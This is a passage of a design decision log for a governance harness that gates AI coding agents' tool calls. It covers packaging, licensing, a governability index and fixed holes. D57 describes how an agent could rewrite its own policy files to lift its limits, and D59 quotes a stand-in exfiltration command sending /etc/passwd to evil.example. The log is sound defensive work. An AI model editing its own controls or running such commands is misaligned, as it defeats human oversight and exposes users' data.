  dominates the plain search. Expand on first use in any public writing — the same hygiene D27
  requires for the AGT / "Agent Hypervisor" collision.
- **Related:** D24, D27, D34, D40, D48, D51, D52; THESIS §2, §3, §8; `STRATEGY.md` (witness over
  depth); [`docs/THIRD-PARTY-ADOPTION.md`](docs/THIRD-PARTY-ADOPTION.md);
  <https://github.com/microsoft/agent-host-protocol> · <https://microsoft.github.io/agent-host-protocol/>

## D54 — `agentic-coding-lab` is a second outbound instrument: capability-first distribution, governed by the same one-way rule

**Date:** 2026-08-06. **Extends** D52 (which added the *outbound instrument* as a fifth
role in D40's topology) by putting a **second** artifact in that role rather than
inventing a sixth. Constrained by D40 (one live implementation), `STRATEGY.md` (witness
over depth), and THESIS §3.

- **Context.** D52 established that an artifact built to be *found* — live, public, aimed
  at an audience that has never heard of the thesis, never a dependency of the
  implementation — is a legitimate fifth role. `detbench` occupies it by attacking the
  detection question. A second gap is larger and closer to home: the people who use
  Claude Code, Codex CLI, OpenCode and Antigravity every day are searching for
  *effectiveness* — skills, subagents, MCP setups, workflows — not for governance. The
  cluster has a governance kernel and no capability-first surface at all. Every artifact
  that makes an agent more effective also makes it reach further, so the two subjects are
  the same subject approached from the side the audience is actually standing on.
- **Decision.** `agentic-coding-lab` is **its own repo in D52's fifth role**: experiments,
  articles and copyable artifacts (skills, plugins, subagents, hooks, MCP configs) for
  agentic software development, each shipped with an honest account of its reach. It is a
  **consumer of `ai2rules`** and nothing else. Created locally 2026-08-06 (`e53f047`); no
  remote yet, deliberately — see the residual on publishing below.
- **The one-way rule, again the load-bearing half.** `agentic-coding-lab` may depend on,
  cite and configure `ai2rules`. **`ai2rules` may never depend on it**, and **nothing
  produced there may become an input to a governance decision** — not a runtime-written
  rule, not a heuristic feeding a verdict, not a "trusted artifact" list the kernel
  consults. Identical in shape to D52's detector prohibition and justified identically:
  the kernel's claim is that a decision is a pure function of `(intent, context, compiled
  world)`, and a convenience artifact with a vote converts a deterministic decision into a
  negotiable one.
- **The differentiator, which constrains the build and so is recorded here.** The
  contract is *"an artifact may not describe itself as safer than it is."* Three tiers —
  **0 unenforced** (prose advice, nothing checks it), **1 overlay** (ships deny/ask rules
  atop the host's permissions; **fails open**), **2 structural** (the capability is
  `ABSENT` from the compiled world, or mediated by the fail-closed `mcp-gateway`). A tier
  ≥ 1 claim must ship the file that does the enforcing, and CI rejects it otherwise. An
  artifact nobody has run must carry `> **Unverified.**` on its own front page.
  This is D52's referee discipline applied to a different sport: the honest label is the
  product, and "hardened"/"sandboxed"/"safe" are exactly the words that would earn stars
  and forfeit the position.
- **Why not inside `ai2rules`.** Rejected for D52's reasons plus one of its own: a
  capability-first artifact buried in a Rust governance workspace inverts the funnel. The
  reader arrives for the skill and meets the thesis on the way out; that only works if the
  skill is the front door. It would also drag a content repo's cadence into a workspace
  whose CI gates a kernel.
- **Why not a directory in `detbench`, or a shared "content" repo.** Different audience,
  different instrument. D52 archived-by-precedent the habit of merging things that merely
  rhyme.
- **Alternatives rejected.**
  - *Publish the recipes as blog posts only.* The upstream blog is argument-first and its
    reader is being persuaded of a position. A recipe's reader wants to go faster today.
    Recorded as an explicit article split in the new repo's charter: if deleting the
    governance section leaves a useful article, it belongs there; if it leaves nothing, it
    belongs on the blog.
  - *Ship a starter pack of artifacts immediately, to look alive.* Rejected by the repo's
    own contract on its first commit — none had been run. `artifacts/` therefore holds a
    template and nothing else, which is the honest state and is said plainly in its README.
  - *Make the tier check advisory.* Rejected: an unenforced honesty rule in a repo whose
    entire pitch is enforced honesty is the failure this cluster spends its time naming in
    others.
- **What was verified, and what was not.** The template's `world.yaml` is a real manifest
  compiled by the real kernel; five verdicts were checked against `harness gate` on both a
  debug and a release build with identical results (`ALLOW Read`; `ASK Bash_destructive`;
  `ABSENT WebFetch / unknown_to_ontology`; `DENY Bash_network / taint_invariant` when
  tainted; `ALLOW Bash_network` when clean), manifest hash `8629c6be6c12`. **Not
  verified:** any end-to-end artifact, because none exists yet. Manifest verification is
  local-only — that repo's CI does not build Rust, by design.
- **Known residual: nothing is published.** *(Amended 2026-08-06, hours after this entry
  landed — the original text said "the repo is local, has no remote".)* It now has one:
  `sv-pro/agentic-coding-lab`, **private**, `origin` only, no GitLab mirror — matching
  `ai-detector-bench` rather than this repo's dual-remote setup. Private is not published,
  so the residual stands rather than closes: **an outbound instrument that is not outbound
  is not yet doing its job.** It still has no LICENSE, and a repo whose point is that
  people copy things out of it is unusable without one. Both remain open calls, not
  oversights; the license one is cluster-wide (`ai2rules` and `ai-detector-bench` carry
  none either). The two come due together — going public is the gate that forces the
  license question, and the first verified artifact is the event that should trigger it.
- **✅ Residual closed 2026-08-08. Both halves, together, as this entry predicted — but the
  trigger was not the one named.** `sv-pro/agentic-coding-lab` is **public**, and all three
  repos carry **MIT** (`ai2rules` `44d6b0c`, `ai-detector-bench` `c97956f`,
  `agentic-coding-lab` `6b49c18`; copyright Sergey Vlasov). The event that forced it was
  **D55**, not a verified artifact: the Governability Index shipped publicly one day earlier
  with its *Contributing a measurement* section pointing at procedures inside a private repo.
  That is not a broken link — **it is D55's conflict-of-interest firewall failing in
  practice**, since the index's entire defence is that a stranger can check it without our
  tooling, and no stranger could read the procedures at all. Verified after the change: an
  unauthenticated fetch of the probe README returns 200.
  **Two things worth keeping from how this closed.** First, D54 and D55 landed a day apart
  and *neither noticed that the second made the first's open residual load-bearing* — an
  entry can convert another entry's known gap into a live defect without either author
  seeing it, which is an argument for reconciling the decision log against the artifacts, not
  only against itself. Second, licensing was never the small half: `ai2rules` had declared
  `MIT OR Apache-2.0` in `Cargo.toml` since E0, inherited by all ten crates, **with neither
  license file ever in the tree** — a grant asserted in metadata with no text to accept.
  *(Amended later the same day — the first pass narrowed this to MIT-only to match the
  siblings; see the correction below.)*
- **Correction, 2026-08-08: `ai2rules` keeps the dual grant. The cluster is not
  single-licensed, and that asymmetry is the decision.** The MIT-only narrowing was reverted
  on the owner's call: `Cargo.toml` declares `MIT OR Apache-2.0` again, and the repo now ships
  **both texts** — `LICENSE-MIT` and `LICENSE-APACHE` — per the Rust ecosystem convention that
  the metadata always implied. The siblings stay **MIT-only**, deliberately.
  **The split follows the roles D52 and D54 already assigned.** The outbound instruments are
  content and tools meant to be *copied out of*, where one permissive license with a minimal
  attribution burden is the entire point; two license files at the root of a recipe repo is
  friction against its only job. `ai2rules` is the one artifact someone might build a product
  **on top of**, and that reader is the one who needs an explicit patent grant — which MIT does
  not provide and Apache-2.0 does. **A licensing choice is a distribution choice, so it should
  follow the topology rather than be applied uniformly for tidiness.** Uniformity was the whole
  argument for MIT-everywhere, and it was the wrong axis.
  **Known cost, measured rather than predicted, because it will look like a regression:**
  GitHub resolves the pair to **`Apache-2.0`** — its API returns that single SPDX id, sourced
  from `LICENSE-APACHE`, and the repo page reports "Apache-2.0, MIT licenses found". So the
  badge *understates* the grant by naming the stricter option and hiding the MIT one. **This
  is the ecosystem-standard outcome, not a misconfiguration: `rust-lang/rust` resolves
  identically** (verified 2026-08-08 — same SPDX id, same source file). A first draft of this
  entry predicted `NOASSERTION`; that was a guess and it was wrong, which is recorded here
  because the number of times this project has been bitten by an unverified assumption is now
  its own pattern. Not a reason to collapse back to one file.
- **Known residual: this is a *seventh* live thing in a cluster that archived eight repos
  to stop exactly this.** So the kill condition is stated up front, per D52's practice:
  **if there is no verified artifact and no published experiment by 2027-02-06, archive it**
  with a README pointer to `ai2rules`.
- **Related:** D24, D33, D40, D47, D48, D51, D52; THESIS §3, §6; `STRATEGY.md` (witness
  over depth); `scripts/install-governance.sh`; `docs/harness-gate-abi.md`.

## D55 — The Governability Index is public and structural; no parameter may require our own tooling to answer

**Date:** 2026-08-07. **Executes** `STRATEGY.md`'s second ranked bet (the governability
index) and **applies D54's split** — definitions here, measurement recipes in the lab.
Constrained by D24 (the host-neutral seam is what makes cross-host comparison legible at
all) and by D52's referee discipline, which this entry extends to a second sport.

- **Context.** `STRATEGY.md` ranks a governability index second among the open bets, on
  two arguments: a ranking travels further than a demo, and whoever defines the benchmark
  defines the category. It stayed unbuilt because its first criterion — "can one portable
  manifest govern it" — is a claim about *our* product, which makes the benchmark look
  like an advertisement. The unlock was noticing that **the presence or absence of a
  pre-execution hook is itself a benchmark parameter**: structural, binary, vendor-owned,
  and answerable by anyone in five minutes. That reframes the whole instrument away from
  "how well does our manifest govern host X" and toward "what does host X let *anybody*
  control".
- **Decision.** The **Agent Governability Index** is a public artifact.
  `docs/GOVERNABILITY-INDEX.md` owns the **parameter definitions, the methodology and the
  results table**; `agentic-coding-lab/artifacts/governability-probe` owns the
  **procedures**. Nine parameters at v0 (G1 intercept · G2 deny · G3 grant · G4 MCP+native
  coverage · G5 cache-satisfiable approval · G6 absent-vs-denied · G7 post-execution
  observation · G8 file-based config · G9 live reload). Shipped `cd37364` / `49d5c88`.
- **The load-bearing constraint — the conflict-of-interest firewall.** **No parameter may
  require `ai2rules` to answer.** We build a governance harness for the hosts this index
  scores; an index whose cells can only be filled with our tooling is marketing wearing a
  table's clothes. If a proposed parameter cannot be checked by someone who has never
  heard of us, it does not go in — *however discriminating it is*. This is the rule that
  makes the rest of the instrument survivable, and it is the first thing to check when
  adding a parameter.
- **Second constraint — the index measures the product, never the model.** Every parameter
  is a yes/no question about what the host *permits*, answerable without running an agent
  task. Admitting one behavioural parameter ("how well does it resist injection") would
  reimport everything the structural design exists to exclude: model non-determinism,
  prompt sensitivity, a shelf life of weeks, and irreproducibility. The value here is
  precisely that a result from March is still a result in November.
- **Third constraint — `?` is a publishable state and a guess is a defect.** Confidence is
  a load-bearing column, as in `MAP.md`: `✓` observed by us, `○` documented but not run,
  `?` unknown. The Codex and Copilot columns are entirely `?` on publication. "We looked
  and did not find a hook" is **not** a measurement and may not be published as a `no`.
- **No composite score. Ever.** A single "governability score" would be exactly the sin
  `detbench` was built to name — AUROC averaging away the decision anyone actually makes
  (D52). Per-parameter cells only. A reader who wants one number wants a number that
  hides which of the nine they should have cared about.
- **The disclosure is structural, not a footer.** The COI statement opens the document,
  before the parameters, with the three constraints above stated as consequences of it.
  Buried, such a disclosure reads as a liability; first, it reads as the reason to trust
  what follows. Also recorded there: a low score is **not** a claim that a host is bad —
  governability is orthogonal to quality, and the index says nothing about how good an
  assistant is.
- **Two parameters were discovered by building the instruments, not by design.** G8
  (file-based config) came from finding that UI-configured connectors are invisible to
  tooling that cannot even report them as missing. G9 (live reload) came from measuring
  that Claude Code reads hook config live rather than snapshotting it at session start —
  the opposite of what we had assumed and stated twice. This is §6's flywheel behaving as
  advertised, and it is the argument for keeping the procedures and the definitions in
  different repos with real users in between.
- **Alternatives rejected.**
  - *Keep it internal.* An index nobody can check is not a benchmark, and witness is the
    binding constraint (`STRATEGY.md`).
  - *One repo for both halves.* Rejected on D54: definitions are positioning and belong
    with the thesis; procedures are practitioner content and belong in the lab. Putting
    the table in the lab would also invert the direction of *authority* — the lab is the
    consumer.
  - *Lead with "can one portable manifest govern it".* That criterion is real and stays in
    `STRATEGY.md` as a product thesis, but as parameter G0 it would fail the COI firewall
    on its first line.
  - *Score the hosts.* See above.
- **Known residual, and the deepest one: we chose the nine questions.** The firewall
  guarantees each parameter is *independently answerable*; it does not guarantee the
  *selection* is neutral. Nine parameters drawn from our own architecture will
  systematically favour hosts shaped like the seam we integrate with. There is no clean
  fix, so the mitigation is procedural: publish proposed parameters that were rejected and
  why, and treat an outside parameter proposal as higher-priority than an outside
  measurement.
- **Known residual: the conventions have no mechanical enforcement.** Dates, host
  versions, `?`-not-guess, observed-vs-documented — all are review discipline. Unlike the
  lab's artifact contract, no CI check can verify that a cell's evidence is real.
- **Known residual: this is the first cluster artifact that names competitors in a scored
  table.** D27 and D53 argue positions against named products, which is ordinary technical
  writing. Assigning cells is a different exposure: a wrong cell is a false claim about
  someone's product, and the correction cost falls on them.
- **Review condition.** If by **2027-02-07** no third party has contributed a measurement
  or contested a cell, the index is a monologue rather than a benchmark — and a benchmark
  nobody engages with is marketing after all. At that point either retire it or hand the
  definitions to someone with no product in the category.
- **Related:** D24, D27, D33, D37, D40, D48 (`force_ask` — the finding behind G5), D51,
  D52 (referee discipline; no composite score), D53, D54; THESIS §6; `STRATEGY.md` (bet 2);
  [`docs/GOVERNABILITY-INDEX.md`](docs/GOVERNABILITY-INDEX.md);
  <https://github.com/sv-pro/agentic-coding-lab>

## D56 — `harness init`: the binary carries its own templates, so adoption needs no checkout

**Date:** 2026-08-09. **Executes `STRATEGY.md`'s first ranked bet** (the productization
wedge), deferred five times. Constrained by D37 (the shim holds no governance logic; the
governed project is untrusted) and by the `roots` primitive (#27, #28), which is what makes
a *generic* starter manifest worth installing at all.

- **Context.** `scripts/install-governance.sh` already governed a project in one command,
  and almost nobody could run it. It needed an **ai2rules checkout** for `--source`
  (templates), **`cargo` or a prebuilt binary** to install a kernel, and **`jq`** to merge
  `settings.json`. Those are three prerequisites in front of a pitch whose entire claim is
  *"kill one concrete fear in five minutes"*. The script is fine; the distribution was the
  product problem, and the strategy has said so since 2026-07-23.
- **Decision.** `harness init [TARGET]` is a first-class subcommand that governs a project
  using **nothing but the binary being invoked**. Three choices carry it, and each removes
  exactly one prerequisite:
  1. **The starter manifest is `include_str!`-ed into the executable.** No checkout.
  2. **The shim bakes `std::env::current_exe()`.** No separate install step — the trusted
     absolute path D37 requires is simply the binary the user just ran.
  3. **The settings merge is `serde_json`.** No `jq`.
  Flags: `--grant` (replace mode), `--force` (replace a tuned manifest), `--dry-run`.
- **The manifest is compiled before it is written, and this is not a nicety.** `init` runs
  the real compiler over the embedded template and writes nothing if it fails. A project
  whose thesis is that governance must be *checkable* does not get to install a manifest it
  never checked; shipping an unbuildable one to a stranger would be the exact failure this
  repo spends its time naming in other people's tools.
- **Idempotence is a security property here, not a convenience.** A duplicated `PreToolUse`
  entry runs the kernel twice per call and doubles latency, which is how a governance tool
  becomes the reason someone disables governance. Merging is keyed on the hook's `command`
  string, foreign hooks and unrelated settings keys are preserved untouched, and a tuned
  `cc-world.yaml` is never replaced without `--force` — losing that file is the worst thing
  this command could do, because it is the only artifact in a governed project that
  represents human judgement.
- **Alternatives rejected.**
  - *Keep improving the shell script.* It cannot remove its own prerequisites: the
    templates live in the checkout by construction, and installing a binary is a separate
    step no matter how the script is written.
  - *Fetch templates from GitHub at init time.* Rejected on the thesis. A governance tool
    that downloads its policy at install time makes the network a trust dependency of the
    trust boundary, and an offline machine is exactly where this should still work.
  - *Generate the manifest from the project (language detection, etc.).* Rejected for now:
    inference is how a deterministic tool acquires a stochastic dependency. A fixed,
    roots-confined starter that the user then tunes keeps the judgement human and visible.
  - *Have `init` install the binary onto `PATH` too.* Rejected — that is the per-machine
    half and belongs to the packaging layer (npm, brew, releases), not to a project-scoped
    command. `install-governance.sh` keeps that half.
- **✅ Residual closed 2026-08-10: the packaging half shipped.**
  [`ai2rules-harness`](https://www.npmjs.com/package/ai2rules-harness) **`0.1.1`** is on the
  public registry — unscoped, zero dependencies, with a `postinstall` that resolves a
  checksum-verified prebuilt from the `v0.1.1` GitHub release. Verified cold from the
  registry: `npx ai2rules-harness init` governs a fresh directory and returns a deny verdict
  for a write outside it. **The agent did not publish it** — a package name is a one-way
  door, so the `npm publish` was left to a human even after everything else was staged and
  the login was in place.
  **Unscoped rather than `@ai2rules/harness`, decided at publish time:** the `@ai2rules`
  org did not exist on npm, so the scoped name would have failed *after* login rather than
  before it, and creating an org to hold one package buys nothing. `npx ai2rules-harness
  init` reads the same.
- **New residual, found by running the published package: under `npx`, the shim bakes a
  path that can disappear.** `init` records the absolute path of the binary that ran it
  (that is what makes the trusted-path requirement of D37 free). Under `npx` that path is
  inside npm's transient `_npx` cache; when the cache is cleaned the binary is gone and the
  shim **fails open** — the host silently returns to its own permissions with no error.
  Fail-open is the correct behaviour for a missing kernel (D37) and this does not change it,
  but it makes `npx` the wrong *durable* install, so both READMEs now recommend
  `npm install -g` and describe `npx` as the way to try it. **The real fix, if this bites
  anyone: have the shim report a missing kernel once instead of failing silently** — but
  that trades a silent hole for a possible per-call warning, which is a design call and not
  a bug fix.
- **Related:** D24 (host-neutral gate ABI), D33/D37 (the cc-hook seam and the untrusted
  project directory), D47, `scripts/starter-world.yaml`, `docs/TUTORIAL.md`, `STRATEGY.md`
  (bet 1), and `crates/cli-harness/tests/init.rs` (14 tests — including that the embedded
  manifest cannot drift from the shipped one, and five regressions from the 2026-08-09
  review, each verified to fail against the pre-fix code).

## D57 — The control plane is read-only to the agent; policy changes are *proposed*, and merged only by deterministic non-agent tools

**Date:** 2026-08-11. **Forced by a working exploit**, reported from real use and reproduced
here. Constrained by THESIS §2 (no stochastic component in the trust path), D37 (the governed
project is untrusted input), and E11 (the World Authoring Tool, which this entry gives a second
job).

- **The vulnerability.** `.claude/` sat inside the project's own writable root, so an agent
  under governance could rewrite the policy binding it. Measured, not inferred:
  `Write`/`Edit` against `.claude/cc-world.yaml`, `.claude/hooks/world-gate.sh` and
  `.claude/settings.json` all returned **silent ALLOW — not even ASK**. Flipping one roots rule
  from `Read` to `ReadWrite` moved a `/etc` write from `DENY` to `ALLOWED` **on the very next
  tool call.**
- **Why `CompiledWorld` immutability did not save us, which was the assumption worth killing.**
  The invariant is real but scoped to a single decision. The shim runs
  `harness cc-hook --world .claude/cc-world.yaml` as a **fresh process per tool call**, so the
  manifest is recompiled every time. There is no "takes effect next session" — there is no
  session. An earlier note in `NEXT.md` speculated immutability might blunt this; it does not,
  and that speculation is retracted here.
- **Decision, part 1 — the control plane is `Read`.** The shipped starter manifest gains one
  rule: `- { path: "./.claude", access: Read }`, in the same "out of bounds even inside an
  allowed parent" block as `~/.ssh` and `/etc/shadow`. Structured writes to the manifest, the
  shim and the hook registration now **DENY**.
- **Read stays allowed, deliberately.** An agent that cannot see its own rules cannot explain a
  denial or propose a sensible change to one, and opacity buys nothing here — the manifest is
  committed to the repo anyway. Secrecy is not the property being defended; **write authority
  is.**
- **Decision, part 2 — the sanctioned path is a *proposal*, not an edit.** Removing write access
  must not remove the useful workflow ("loosen this rule so I can finish"). The agent may emit a
  **patch** against the manifest; that patch is inert until merged by a **deterministic,
  non-agent, user-facing tool** — the World Authoring Tool (E11, `harness serve`) being the
  obvious host, since it already compiles manifests with the real compiler and already puts a
  human in front of the result.
  **This is the project's own propose/decide split applied one level up.** A `ToolCall` is a
  proposal until `IRBuilder::build` seals it; a manifest patch is a proposal until a human-driven
  deterministic tool merges it. The model's authority over policy becomes exactly what its
  authority over execution already is: **it may ask, and nothing it writes takes effect by
  itself.**
  Proposals live **outside `.claude/`** (the whole directory is read-only, and a carve-out is a
  path-traversal target — this repo has fixed that class twice, #36 and #37). Implementation is
  deliberately not specified here beyond that constraint.
- **Known residual, stated because it is the obvious next question: the shell path is `ASK`, not
  `DENY`.** Path scoping keys on the `file_path` argument of structured tools. `sed -i`,
  `echo >`, `cat >` and `rm` against the same files are classified as commands and land on
  approval-required. A human is in the loop, which is a categorical improvement on silent allow,
  but it is not a block. Closing it properly means the kernel understanding write targets inside
  shell commands — which is a real piece of work and belongs to its own entry, not to a
  parenthesis in this one.
- **Alternatives rejected.**
  - *Hash-pin the manifest in the shim.* Makes tampering loud rather than impossible, and adds a
    second source of truth that drifts the moment someone legitimately edits the manifest.
  - *Move the manifest out of the project.* Closes it, and forfeits the property that makes a
    manifest worth having: policy committed alongside the code it governs, reviewed in the same
    pull request.
  - *Deny reads too.* Rejected above — costs the proposal workflow and buys no secrecy.
  - *A privileged MCP tool that edits the manifest.* Rejected as the primary mechanism. It is
    strictly worse than the file write it replaces: advertised in `tools/list`, therefore the
    first thing an injection enumerating tools will find, and certain to be allow-listed for
    convenience. If one is ever built it needs all four of — direct writes closed, edits applying
    only on the next compile, manifest edits denied under taint as a **kernel** invariant (a
    manifest rule protecting the manifest is circular), and a human-minted approval token
    (`ApprovalStore`, E6) the model cannot forge.
- **Related:** D37 (untrusted project directory), D47, E6 (`ApprovalStore`), E11 (the authoring
  tool that gains the merge role), #27/#28 (`roots`), #36/#37 (path canonicalization — the class
  a `.claude/` carve-out would reopen), `scripts/starter-world.yaml`, and
  `crates/cli-harness/tests/init.rs` (three tests: writes denied, reads allowed, ordinary project
  writes unaffected).

## D58 — The npm package ships per-platform binaries as optional dependencies, and runs no install script

**Date:** 2026-08-11. **Amends D56's packaging half.** Prompted by an outside signal —
Socket.dev scored `ai2rules-harness` **64% on supply chain security** — and the score was
correct.

- **The uncomfortable part first.** The package existed to distribute a governance kernel,
  and its own install did this: run a `postinstall`, `fetch()` a binary from the internet,
  unpack it with `spawnSync('tar')`, `chmod 0o755`, and leave it ready to execute. That is
  a close description of the attack class supply-chain scanners exist to catch. A scanner
  cannot tell our download from a hostile one and should not try. **The score was not a
  false positive; it was a correct reading of behaviour we had chosen.**
- **The real weakness underneath the score, which matters more than the number.** The
  checksum was fetched from the *same host, at the same moment,* as the artifact it
  verified. That proves the file arrived intact. It says nothing about whether it is the
  right file: anyone able to replace the binary could replace the digest beside it. **That
  is integrity, not provenance** — the distinction this project spends its time drawing
  everywhere else.
- **Decision.** Four platform packages — `ai2rules-harness-{linux-x64,darwin-x64,darwin-arm64,win32-x64}`
  — each containing one prebuilt binary and declaring `os`/`cpu`. The wrapper lists them in
  `optionalDependencies`; npm resolves exactly one and skips the rest. **The wrapper has no
  `scripts` block at all.** `bin/harness.js` resolves the binary at runtime via
  `require.resolve`, which works across npm/pnpm/yarn layouts.
  Consequences, in the order they matter: no install-time network, shell, or chmod; the
  binary is covered by the integrity hash npm writes into the *consumer's* lockfile; and
  publishing moves into CI with `--provenance`, signing each tarball against the workflow
  and commit that produced it. Installs also become reproducible, offline-cacheable, and
  usable behind a proxy or mirrored registry — none of which was true before.
- **A hole this restructure exposed rather than created.** With the binary in
  `node_modules`, `harness init` was baking a kernel path **inside the project it governs**.
  Measured: `Write` to that path returns ALLOW, and swapping in a no-op makes every verdict
  vanish. The same was true of `0.1.1`'s `vendor/harness`; nobody had looked. **`init` now
  refuses when the resolved binary is inside the target project** (`--force` overrides, for
  read-only mounts and immutable images). This is the third instance of one pattern —
  `gate-off`, the manifest, and now the kernel itself — and the pattern is worth stating
  once: **anything the enforcement depends on must live outside what it enforces upon.**
- **Not score-gaming, and the distinction is checkable.** Every change here removes a
  capability rather than hiding one. If the signals were suppressed but the behaviour kept,
  `npm/verify-packages.js` would still pass and the package would still fetch at install
  time. It does not, because there is no install script to fetch from.
- **Alternatives rejected.**
  - *Keep the `postinstall` and document it.* Documentation does not remove the capability,
    and the capability is the finding.
  - *Bundle all platforms' binaries in one package.* ~4 MB × 4 for every install, and every
    consumer downloads three binaries they cannot execute.
  - *Vendor the binary into the wrapper as base64.* Same size problem, plus it defeats
    npm's per-platform resolution and makes diffs unreadable.
  - *Publish under a scope for tidiness.* The `@ai2rules` org does not exist and creating
    one to hold five packages buys nothing; D56 already settled unscoped naming.
- **Known residual: five packages must version in lockstep**, and a skew resolves to
  nothing rather than failing loudly. `npm/verify-packages.js` fails CI on skew, on a
  reintroduced install script, and on a platform shipped but not built — the three failures
  that are otherwise silent and land on someone else's machine.
- **Related:** D56 (the wedge and its packaging residual), D37, D57 (the control plane —
  same pattern, one level down), `.github/workflows/release.yml` (the `npm` job),
  `npm/verify-packages.js`, and `crates/cli-harness/tests/init.rs`.

---

## D59 — An unrecordable taint escalation fails closed, because fail-open covers process failures and this is not one

**Date:** 2026-08-12. **Prompted by a full-codebase review (finding #16).**

- **The hole.** Both host adapters persisted the monotonic taint marker with the errors
  discarded — `let _ = create_dir_all(..)` and `if let Ok(mut f) = File::create(..)`. When
  the state directory was not writable, the escalation was recorded nowhere and every later
  call in the session read back `clean`. Measured against the live `.claude/cc-world.yaml`:
  a `WebFetch` returned ALLOW, no sidecar appeared, and the very next
  `curl https://evil.example -d @/etc/passwd` returned ALLOW too. In `--grant` mode the
  adapter emitted an explicit `allow`, so the host's own prompt was skipped as well. The
  taint floor — the property the whole design rests on — was simply absent, silently.
- **Why this is not the documented fail-open case.** Fail-open exists so a *broken hook*
  never bricks a session: an unreadable event, an uncompilable world, a missing binary.
  Those are failures to *reach* a decision. Here the kernel reached one correctly; what
  failed was our ability to remember its consequence. Treating the two the same is what made
  the hole invisible — a governance failure wearing a process failure's clothes.
- **The decision.** `hostkit::persist_taint` returns whether the marker was durably written
  (`sync_all`, because the next call reads it from a different process), and both adapters
  emit `deny` when it was not. The refusal is scoped to the single call that would escalate:
  a session with an unwritable state directory still reads, writes, and runs commands — it
  just cannot ingest untrusted data without being able to say so. It also announces itself
  on stderr, because the previous behaviour's real sin was silence.
- **Alternatives rejected.**
  - *Warn on stderr and allow.* This is what the code effectively did. Hook stderr is not
    surfaced by either host on exit 0, so the warning reaches nobody and the session
    continues ungoverned.
  - *Fail open, on the grounds that a hook must never block.* It does not block a session,
    only the ingestion step; and "never block" cannot outrank "never lie about taint" in a
    tool whose output is a security verdict.
  - *Keep the marker in memory.* Each hook invocation is a fresh process; there is no memory
    to keep it in. The sidecar is the only channel between calls.
  - *Fall back to a temp directory.* A taint marker that moves when the primary location
    fails is a marker the next call cannot find, which reproduces the bug with extra steps.
- **Related:** D33, D37, D48; `crates/cli-harness/src/hostkit.rs`, and the
  `unwritable_taint_sidecar_*` tests in both adapter suites.

---

## D60 — The committed WASM artifact is checked semantically against the kernel, not byte-for-byte

**Date:** 2026-08-12. **Prompted by the same review (finding #18).**

- **The drift.** `blog/public/vendor/harness-wasm/` is a build output kept in git so the
  playground can load it as a static asset. Nothing rebuilt it. Between 2026-06-22 and
  2026-08-12 it fell nine preview-affecting commits behind — the entire `roots` feature and
  D36 command classification among them — while reporting `version() == "0.0.1"` and every
  CI job stayed green. AGENTS.md had stated the no-drift invariant the whole time. An
  invariant nothing checks is a wish.
- **What the drift actually cost.** Less than it first appears, and the distinction matters:
  the WASM surface exports `preview`, `default_world`, and `version` — not `gate`. So the
  playground was never running an exploitable pre-fix gate; it was *misdescribing* the
  current kernel's decisions to anyone evaluating the project in a browser. A fidelity
  failure, not an exposed vulnerability. Worth fixing on both counts.
- **The decision.** `scripts/check-wasm-freshness.mjs` loads the committed artifact *and* a
  freshly built one and requires them to answer identically: same `version()`, same bundled
  `default_world()`, same `preview()` over a case set that deliberately includes a `roots`
  world and a `command_classes` world — the two features whose absence went unnoticed. The
  `wasm` CI job builds from source and runs it.
- **Alternatives rejected.**
  - *Byte-compare the committed artifact against a fresh build.* The obvious check, and it
    would go red every time `dtolnay/rust-toolchain@stable` or wasm-pack changed codegen.
    That is drift in the build, not in the kernel, and a check that cries wolf gets deleted.
  - *Compare only `version()`.* It would have caught this instance (0.0.1 vs 0.2.1) and
    nothing else: a rebuild within one version window is exactly when drift is hardest to
    see. The preview cases are what give the check teeth — verified by diffing the stale
    artifact against the current one on the `command_classes` case.
  - *Stop committing the artifact and build it in the blog pipeline.* Defensible, and a
    larger change than this finding warrants: it puts a Rust and wasm-pack toolchain in the
    blog's build path. Revisit if the blog ever needs the engine at more than one version.
  - *Install wasm-pack in CI via a third-party action.* This project reviews other people's
    supply chains; it should not add an unpinned action to a workflow to save ninety
    seconds. `cargo install wasm-pack --locked`.
- **Related:** D22 (one engine, no reimplementation), E14; `.github/workflows/ci.yml` (the
  `wasm` job), `scripts/check-wasm-freshness.mjs`.

---

## D61 — Every entry point resolves manifest roots, and the shared case set proves it

**Date:** 2026-08-13. **Completes D46/D59's path-scope story; prompted by finding #15.**

- **The gap the fix left behind.** D59 fixed `agy-hook` to canonicalize manifest roots the
  way `cc-hook` already did. What it did not fix is *why nobody noticed for as long as
  roots have existed*: `docs/demos/one-kernel/cases.yaml` had no path cases. The suite whose
  entire job is to prove the hosts agree never exercised the one feature where they
  disagreed. A parity harness only covers what you feed it, and this one was starved.
- **A second world, not roots bolted onto the first.** Enabling `roots` on
  `demo-world.yaml` changes the verdict of every path-shaped action arriving without a
  resolved target — its existing `read` case correctly becomes `missing_path` DENY, and the
  shell demo that asserts the old output breaks. One world cannot hold both stories, so
  path-scope gets `roots-world.yaml` + `roots-cases.yaml` and its own two parity tests.
- **The fixture is real and one rule is deliberately not canonical.** `{project}` is
  substituted with an actual temp directory containing actual files, because root policy is
  decided after canonicalization through the filesystem and a fixture of imaginary paths
  pins imaginary behaviour. One rule points at `{project}/link`, a symlink to
  `{project}/private`. That rule is the regression anchor: an entry point that resolves the
  action path but leaves the root lexical stops matching it, and its `Deny` degrades to the
  policy `default`. Verified by reverting each fix in turn — the adapter test fails with
  `path_scope_ask` where it expects `deny`, and the wire-ABI test fails on `manifest_hash`.
- **`harness gate` had the same hole (finding #26), so it is fixed here too.** It compiled
  the manifest itself and never resolved roots, so a caller of the documented wire ABI had
  nowhere to do it — relative rules, `~` rules and symlinked rules all silently stopped
  binding. It now performs the same resolve-then-canonicalize step as the two hooks. The
  kernel stays pure; this is the adapter half of the boundary, and it must not differ per
  entry point.
- **Schemas and cross-host portability are currently exclusive (finding #27).** The
  adapters alias host argument keys into the neutral vocabulary by *adding* keys
  (`AbsolutePath` → `path`, `CommandLine` → `command`), and schema validation rejects
  properties a schema does not declare — so an Antigravity call against a schema-bearing
  action returns `schema_violation` no matter how well-formed it is. `.agents/agy-world.yaml`
  already declares no schemas; `roots-world.yaml` matches, with the reason written down
  rather than left as folklore. Reconciling the two properly (alias-aware validation, or
  declaring the host keys) is open.
- **Alternatives rejected.**
  - *Add roots to `demo-world.yaml`.* Breaks the existing case set and the shell demo, for
    the reason above.
  - *Hardcode absolute fixture paths like `/etc` and `/etc/shadow`.* `/etc` is a symlink on
    macOS, so the fixture would itself be the thing under test. A generated temp tree is the
    only portable way to control canonicality.
  - *Make every root canonical so the world needs no resolution.* The test would pass on
    every entry point including the broken ones, which is precisely the failure being
    corrected.
